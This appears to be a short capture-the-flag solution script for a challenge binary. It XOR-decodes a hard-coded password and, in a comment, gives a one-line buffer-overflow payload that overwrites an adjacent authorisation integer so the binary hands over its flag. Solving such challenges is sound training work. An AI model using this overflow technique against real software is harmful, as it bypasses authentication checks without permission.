
#for static solve
encoded = [ 0x3B, 0x65, 0x21, 0x0A, 0x26, 0x10, 0x36, 0x20, 0x07, 0x30, 0x0A, 0x25, 0x14, 0x26, 0x26, 0x22, 0x65, 0x27, 0x31]
decoded=''
for i in encoded:
    decoded = decoded + chr(i ^ 0x55)
print (decoded) # will print the password in clear text

# for PWN solve 

'''
    BOF --> the password buffer with data 24 byte overflow it to write on the authorised integer and change it to be = 1

    in terminal just execute --> python2.7 -c 'print b"x"*24 + b"\x01\x00\x00\00"' > payload  note the eindines is little thats why we wrote the bytes from left to right 

    now execute the binary and pass the payload  ./bin < payload | you will get the flag

'''